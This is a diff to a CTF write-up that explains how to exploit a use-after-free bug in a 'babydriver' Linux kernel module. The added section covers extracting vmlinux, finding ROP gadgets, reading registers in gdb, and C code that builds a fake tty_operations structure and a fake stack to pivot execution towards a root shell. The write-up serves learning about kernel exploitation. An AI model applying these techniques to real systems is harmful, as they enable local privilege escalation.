@@ -113,7 +113,7 @@ close(fd1);
  On first call to open a buffer (let's name it buffer1) of size 0x40 gets allocated and we get a handle fd1. On second call to open we allocate new buffer (name it buffer2), get handle fd2 and we just loose track of the previous one. As c has no garbage collector this leads to memory leaks but it is not vulnerable itself. But then we call close(fd1) and we free the buffer2. The memory chunk gets placed back to kmalloc_cache but we still can access it via fd2. This is standard example of use-after-free vulnerability.
 
 ## Exploit
-As I had no experience with exploiting use-after-free I used [lexfo](https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html) tutorial a lot.ne I really recommend it to anyone who want's to start with kernel exploitation. Moreover I saw some writeups later on and it seems that there is another way to repair the stack with `swapgs` gadget.
+As I had no experience with exploiting use-after-free I used [lexfo](https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html) tutorial a lot. I really recommend it to anyone who want's to start with kernel exploitation. Moreover I saw some writeups later on and it seems that there is another way to repair the stack with `swapgs` gadget.
 
 ### Gaining control over RIP via tty_struct
 Above in UAF section I've presented a situation where a freed memory chunk gets placed back in kmalloc_cache but we can still write and read on it. To gain control over execution flow we have to force kernel allocator (SLUB) to allocate some object we have control over on the chunk we freed. There are standard techniques for this. One of them is using `tty_struct` object of size 0x2e0 for this (0x2e0 will land in bucket: 2^10).
@@ -346,6 +346,7 @@ fail:
 int alloc_fake_structures(void)
 {
     g_fake_tty_operations = malloc(TTY_OPERATIONS_SIZE);
+    memset(g_fake_tty_operations, 0x41, TTY_OPERATIONS_SIZE);
     *((uint64_t *)g_fake_tty_operations + 12) = (uint64_t)payload;
 
     return 0;
@@ -533,7 +534,188 @@ As we cannot directly execute userland code, we have to use ROP instead. We will
 - [ ] pop shell with system("/bin/sh")
 
 ### Looking for gadgets
+To find gadgets we need to extract vmlinux first. We will extract it from bzImage, but it will not contain any symbols and so it won't be really helpful when debugging.
+I've used [z2x](https://github.com/zuiurs/z2x):
 
+```console
+$ z2x bzImage
+$ file vmlinux
+vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=e993ea9809ee28d059537a0d5e866794f27e33b4, stripped
+$ ROPgadget --binary vmlinux | sort > gadget.lst
+```
+
+First we need to find a gadget for stack pivoting. For this we have to check the state of registers just when calling our arbitrary address (ioctl). You can do it either with gdb or by making kernel panic. I've picked the first option.
+
+We need to stop at the beginning of payload function. To get address of it we can first add a simple printf which will display payload address and then breakpoint on babywrite. To get address of babywrite use /proc/kallsyms:
+
+```console
+$ cat /proc/kallsyms | grep baby
+ffffffffc0000000 t babyrelease	[babydriver]
+ffffffffc00024d0 b babydev_struct	[babydriver]
+ffffffffc0000030 t babyopen	[babydriver]
+ffffffffc0000080 t babyioctl	[babydriver]
+ffffffffc00000f0 t babywrite	[babydriver]
+ffffffffc0000130 t babyread	[babydriver]
+```
+
+add a printf statement:
+
+```c
+int alloc_fake_structures(void)
+{
+    g_fake_tty_operations = malloc(TTY_OPERATIONS_SIZE);
+    *((uint64_t *)g_fake_tty_operations + 12) = (uint64_t)payload;
+
+    printf("[i] payload: %p\n", payload);
+
+    return 0;
+}
+```
+
+In the first tab run modified boot.sh script with added -s -S flags:
+
+```console
+$ cat gboot.sh
+#!/bin/bash
+
+qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64 -s -S
+
+$ sudo ./gboot.sh
+./exploit
+```
+
+and in the second tab run gdb. Set hardware breakpoint on babywrite, continue and check first tab (where address of payload should be displayed)
+
+```gdb
+$ gdb
+(gdb) target remote :1234
+(gdb) hb *0xffffffffc00000f0
+Hardware assisted breakpoint 2 at 0x400b4d
+(gdb) Continuing.
+Breakpoint 1, 0xffffffffc00000f0 in ?? ()
+(gdb)
+```
+
+check first tab for paylad address:
+
+```console
+$ ./exploit
+[i] payload: 0x400b4d
+[    7.270036] device open
+[    7.271057] device open
+[    7.271772] alloc done
+[    7.272395] alloc done
+[+] Initialization succeed.
+[    7.273337] device release
+[+] Triggered use-after-free.
+```
+
+Now go back to second tab and set hardware breakpoint on payload function and continue execution. When it hits a breakpoint check registers:
+
+```gdb
+(gdb) hb *0x400b4d
+Hardware assisted breakpoint 2 at 0x400b4d
+(gdb) c
+Continuing.
+Breakpoint 2, 0x0000000000400b4d in ?? ()
+(gdb) info registers
+rax            0x400b4d	4197197
+rbx            0xffff880000a59000	-131941384482816
+rcx            0x1da6b20	31091488
+rdx            0x0	0
+rsi            0x0	0
+rdi            0xffff880000a59000	-131941384482816
+rbp            0xffff880000a53e98	0xffff880000a53e98
+rsp            0xffff880000a53de8	0xffff880000a53de8
+r8             0x1da5880	31086720
+r9             0x16	22
+r10            0x0	0
+r11            0x293	659
+r12            0x0	0
+r13            0x0	0
+r14            0xffff880002bd8500	-131941349358336
+r15            0xffff880000a59800	-131941384480768
+rip            0x400b4d	0x400b4d
+```
+
+You want to look for userland addresses. In this case in rcx there is an userland address:
+
+```console
+(gdb) x/2gx 
+0x1da6b20:	0x4141414141414141	0x4141414141414141
+```
+
+More precisely, rcx contains address of fake tty_operations! One idea would be to find a stack pivot gadget: mov rsp, rcx. It's not bad, but there are two problems:
+
+1) If we pivot the stack to point to fake tty_operation structure, then we have to find another way to jump over our gadget which is at 0x18 offset. 
+
+2) There is not mov rsp, rXX nor xchg rsp, rXX gadget :)
+
+But there is still hope. We can allocate fake tty_operations at address higher then 32 bits and fake stack at address equal to: tty_opeartions & 0xffffffff. Then we will use `mov esp, ecx` gadget (the higher 32 bits will be zeroed) to pivot the stack.
+
+To allocate structures at a specific memory use mmap instead of malloc.
+
+```c
+
+#define MOV_ESP_ECX ((uint64_t)0xffffffff8101dd39)
+
+/**
+ * Allocate fake tty_operations struct and fake stack. Use mmap syscall to 
+ * allocate:
+ * - g_fake_stack at low memory region
+ * - g_fake_tty_operations above 0xffffffff address
+ * Moreover g_fake_stack must be equal to g_fake_tty_operations & 0xffffffff.
+ * We will use above property later when performing stack pivot. We will use:
+ * `mov esp, ecx ; ret` 
+ * gadget, where rcx holds address of g_fake_tty_operations. This way we will
+ * make esp point to g_fake_stack.
+ */
+int alloc_fake_structures(void)
+{
+    /* Arbitrary value, must not collide with already mapped memory (/proc/<PID>/maps) */
+    void *starting_addr = (void *)0x100000000 + 0x20000000;
+    size_t max_try = 10;
+
+retry:
+    g_fake_tty_operations = (char *)_mmap(starting_addr, TTY_OPERATIONS_SIZE, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS | MAP_LOCKED | MAP_POPULATE, -1, 0);
+    if (g_fake_tty_operations == MAP_FAILED)
+        goto retry;
+
+    g_fake_stack = (char *)_mmap((uint64_t)g_fake_tty_operations & 0xffffffff, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS | MAP_LOCKED | MAP_POPULATE, -1, 0);
+    if (g_fake_stack == MAP_FAILED)
+    {
+        munmap((void *)g_fake_tty_operations, TTY_OPERATIONS_SIZE);
+        goto retry;
+    }
+
+    /* Paranoid check :) */
+    if ((uint64_t)g_fake_stack != ((uint64_t)g_fake_tty_operations & 0xffffffff))
+    {
+        munmap((void *)g_fake_tty_operations, TTY_OPERATIONS_SIZE);
+        munmap((void *)g_fake_stack, PAGE_SIZE);
+        goto retry;
+    }
+
+    if (max_try == 0)
+    {
+        fprintf(stderr, "[-] Failed to allocate fake structures\n");
+        return -1;
+    }
+    max_try--;
+    starting_addr += PAGE_SIZE;
+
+    printf("[i] g_fake_tty_operations: %p\n", g_fake_tty_operations);
+    printf("[i] g_fake_stack: %p\n", g_fake_stack);
+
+    memset(g_fake_tty_operations, 0x41, TTY_OPERATIONS_SIZE);
+    /* Set fake_tty_operations->ioctl=stack_pivot gadget. */
+    *((uint64_t *)g_fake_tty_operations + 12) = MOV_ESP_ECX;
+
+    build_rop_chain((uint64_t *)g_fake_stack);
+
+    return 0;
+}
+```
 
 ## References:
 - https://blog.csdn.net/lukuen/article/details/6935068
